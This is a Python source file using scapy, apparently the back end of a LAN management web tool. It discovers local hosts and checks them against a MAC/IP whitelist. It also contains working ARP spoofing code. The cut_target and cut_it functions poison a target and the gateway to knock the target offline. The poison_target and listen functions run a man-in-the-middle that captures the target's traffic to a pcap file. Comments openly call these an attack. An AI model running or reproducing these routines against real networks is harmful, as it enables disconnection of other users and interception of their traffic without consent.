#!/usr/bin/env python
# -*- coding:utf-8 -*-
from scapy.all import *
from utils import active_host, get_hostname_by_ip, load_rules,start_sniff_arp,\
    restore_target,get_mac,set_ip_forwarding

from web import socketio,app
from host import Host
import json
import time
from job import Job




import logging
logger = logging.getLogger('nct')
IP_SECTION = app.config['IP_SECTION']
GATEWAY = app.config['GATEWAY']
GATEWAY_MAC = app.config['GATEWAY_MAC']
#IP = app.config['IP']
COUNT = app.config['PACKET_COUNT']
TIME = app.config['TIME']

LOCK_LISTEN = True
LOCK_CUT = True

class Nct():
    def __init__(self,ip_section = "192.168.1.*",mode = 1):
        self.ip_section = ip_section
        self.rulesname = 'config/rules.json'
        self.hostname_list = []
        self.rules_mode = mode
        #self.host_list,self.ip_list,self.mac_list = active_host(self.ip_section)
        self.host_list = []
        self.ip_list = []
        self.mac_list = []
        self.last_packet = None
        self.hosts = []
        self.ip_format = self.ip_section[0:-1]+'0/24'
        self.sniff_status = False




    def get_host_list(self):
        self.get_host_after_rules()
        return self.host_list


    def refresh_list(self):
        self.host_list= active_host(self.ip_section)
        self.get_host_after_rules()
        return self.hosts

    def get_hostname_list(self):
        self.hostname_list = []
        for ip in self.ip_list:
            #print ip
            hostname = get_hostname_by_ip(ip)
            self.hostname_list.append(hostname)
        return self.hostname_list

    def get_rules(self):
        return load_rules(self.rulesname)

    def set_mode(self,mode):
        self.rules_mode = mode


    def get_host_after_rules(self):
        self.hosts = []
        rules_dict = self.get_rules()
        for host in self.host_list:
            if rules_dict.has_key(host[1]) or host[0] in rules_dict.values():
                if rules_dict[host[1]] == host[0] :
                    logger.info("ip: {0} match right mac:{1}!".format(host[0],host[1]))
                    self.hosts.append(Host(host[0],host[1],'在白名单中'))
                else:
                    self.hosts.append(Host(host[0], host[1], '与白名单不符'))
                    logger.info("ip: {0} match wrong mac:{1}!".format(host[0],host[1]))
            else:
                self.hosts.append(Host(host[0], host[1], '不在白名单中'))
                logger.info("ip {0}: is not in rules ,ip is {1}".format(host[0],host[1]))

    def cut_target(self,gateway_ip, gateway_mac, target_ip, target_mac):
        # 构建欺骗目标的ARP请求()，这里没设置hwsrc,默认就是本机咯
        # 简单来说：告诉被攻击机器，本机（攻击机）的mac是网关，就是攻击者的机器是网关
        poison_target = ARP()
        poison_target.op = 2  # 响应报文
        poison_target.psrc = gateway_ip  # 模拟是网关发出的, 其实是我们的机器发出的
        poison_target.pdst = target_ip  # 目的地是目标机器
        poison_target.hwdst = target_mac  # 目标的物理地址是目标机器的mac

        # 构建欺骗网关的ARP请求()，这里没设置hwsrc,默认就是本机咯
        poison_gateway = ARP()
        poison_gateway.op = 2  # 响应报文
        poison_gateway.psrc = target_ip  # 模拟是目标机器发出的,
        poison_gateway.pdst = gateway_ip  # 目的地是网关
        poison_gateway.hwdst = gateway_mac  # 目标的物理地址是网关的mac

        print "[*] Beginning the ARP attack. ［CTRL_C to stop］"

        while LOCK_CUT:
            try:
                # 开始发送ARP欺骗包(投毒)
                send(poison_target)
                send(poison_gateway)
                # 停两秒
                print "send packet!"
                time.sleep(2)
            except KeyboardInterrupt:
                restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        print "[*] ARP poison attack finished"
        return

    def cut_it(self,target_ip,target_mac):
        conf.verb = 0
        cut_thread = Job(target=self.cut_target, args=(GATEWAY, GATEWAY_MAC, target_ip, target_mac))
        cut_thread.setDaemon(True)
        cut_thread.start()
        try:
            print "[*] Starting attack  {} mac:{}".format(target_ip,target_mac)
            time.sleep(TIME)#断网十分钟

            global LOCK_CUT
            LOCK_CUT = False
            cut_thread.stop()

            # 还原网络配置
            restore_target(GATEWAY, GATEWAY_MAC, target_ip, target_mac)
            return True
        except KeyboardInterrupt:
            # 还原网络配置
            restore_target(GATEWAY, GATEWAY_MAC, target_ip, target_mac)
            return False

    def packet_callback(self,packet):
        if self.last_packet is None:
            self.last_packet = packet
        if  self.last_packet[ARP].psrc != packet[ARP].psrc or self.last_packet[ARP].hwsrc != packet[ARP].hwsrc:
            rules_dict = self.get_rules()
            if (packet[ARP].psrc, packet[ARP].hwsrc) in self.host_list or packet[ARP].hwsrc == 'c8:3a:35:c9:5d:dc' \
                or packet[ARP].hwsrc == '00:00:00:00:00:00' or packet[ARP].psrc == '0.0.0.0':
                #logger.info('pass the host :' + packet[ARP].psrc + ' mac : ' + packet[ARP].hwsrc)
                pass
            else:
                ip = packet[ARP].psrc
                mac = packet[ARP].hwsrc
                self.host_list.append((ip, mac))

                if rules_dict.has_key(packet[ARP].hwsrc):
                    if rules_dict[packet[ARP].hwsrc] == packet[ARP].psrc:
                        self.hosts.append(Host(ip,mac,'在白名单中'))
                        #logger.info("2. host {0} in rules. mac:{1}!".format(packet[ARP].psrc, packet[ARP].hwsrc))
                    else:
                        self.hosts.append(Host(ip, mac, '与白名单不符'))
                        #logger.info("2. host {0} have a wrong ip:{1}!".format(packet[ARP].hwsrc, packet[ARP].psrc))
                else:
                    self.hosts.append(Host(ip, mac, '不在白名单中'))
                    #logger.info("2. host {0} is not in rules ,ip is {1}".format(packet[ARP].hwsrc, packet[ARP].psrc))
                socketio.emit(
                    'new_host_up', {'ip': packet[ARP].psrc, 'mac': packet[ARP].hwsrc,'status':self.hosts[-1].cut}, namespace='/newone'
                )
        else:
            #丢弃同一主机ARP包
            pass
            #logger.info("drop the packet mac:{0} ip:{1}".format(packet[ARP].hwsrc, packet[ARP].psrc))
        self.last_packet = packet


    def start_service(self):
        start_sniff_arp(self.packet_callback,self.ip_format)


    def stop_sniff(self,packet):
        #packet.show()
        pass

    def poison_target(self,gateway_ip, gateway_mac, target_ip, target_mac):

        # 构建欺骗目标的ARP请求()，这里没设置hwsrc,默认就是本机咯
        # 简单来说：告诉被攻击机器，本机（攻击机）的mac是网关，就是攻击者的机器是网关
        poison_target = ARP()
        poison_target.op = 2  # 响应报文
        poison_target.psrc = gateway_ip  # 模拟是网关发出的, 其实是我们的机器发出的
        poison_target.pdst = target_ip  # 目的地是目标机器
        poison_target.hwdst = target_mac  # 目标的物理地址是目标机器的mac

        # 构建欺骗网关的ARP请求()，这里没设置hwsrc,默认就是本机咯
        poison_gateway = ARP()
        poison_gateway.op = 2  # 响应报文
        poison_gateway.psrc = target_ip  # 模拟是目标机器发出的,
        poison_gateway.pdst = gateway_ip  # 目的地是网关
        poison_gateway.hwdst = gateway_mac  # 目标的物理地址是网关的mac

        print "[*] Beginning the ARP poison. ［CTRL_C to stop］"

        while LOCK_LISTEN:
            try:
                print 'send arp packet'
                # 开始发送ARP欺骗包(投毒)
                send(poison_target)
                send(poison_gateway)
                # 停两秒
                time.sleep(2)
            except KeyboardInterrupt:
                restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        print "[*] ARP poison attack finished"
        return

    def listen(self,target_ip,target_mac):
        set_ip_forwarding(1)
        conf.verb = 0
        GATEWAY_MAC = get_mac(GATEWAY)
        packet_count = COUNT
        poison_thread = Job(target=self.poison_target, args=(GATEWAY, GATEWAY_MAC, target_ip, target_mac))
        poison_thread.setDaemon(True)
        poison_thread.start()
        try:
            print "[*] Starting sniffer for %d packets" % packet_count

            bpf_filter = "ip host %s " % target_ip  # 过滤器
            #sniff_thread = Job(target=start_sniff,args=(packet_count,bpf_filter))
            #sniff_thread.setDaemon(True)
            #sniff_thread.start()
            packets = sniff(count=packet_count, filter=bpf_filter,prn=self.stop_sniff)#,stopper = self.stop_sniff(),stopper_timeout=1)
            #time.sleep(5)
            # 将捕获到的数据包输出到文件

            global LOCK_LISTEN
            LOCK_LISTEN = False
            poison_thread.stop()
            #sniff_thread.stop()
            wrpcap('{}.pcap'.format(target_ip), packets)
            # 还原网络配置
            restore_target(GATEWAY, GATEWAY_MAC, target_ip, target_mac)
            set_ip_forwarding(0)
            return True
        except Exception,e:
            print e
            # 还原网络配置
            restore_target(GATEWAY, GATEWAY_MAC, target_ip, target_mac)
            set_ip_forwarding(0)
            return False

    def policy(self,host_ip,host_mac):
        new_policy = None
        value = False
        with open('config/rules.json',"r") as f:
            old_policy = json.load(f)
            if old_policy.has_key(host_mac):
                return False
            new = {host_mac:host_ip}
            new_policy = dict(old_policy,**new)
        with open('config/rules.json',"w") as f:
            json.dump(new_policy,f)
            value = True
        return value




nct = Nct(IP_SECTION)

'''
if __name__ == '__main__':
    pass
    #nct = Nct()
    #nct.cut_it('192.168.1.101','64:9a:be:8d:d7:24')
    #nct.listen('192.168.1.101','64:9a:be:8d:d7:24')
    #list = nct.refresh_list()
'''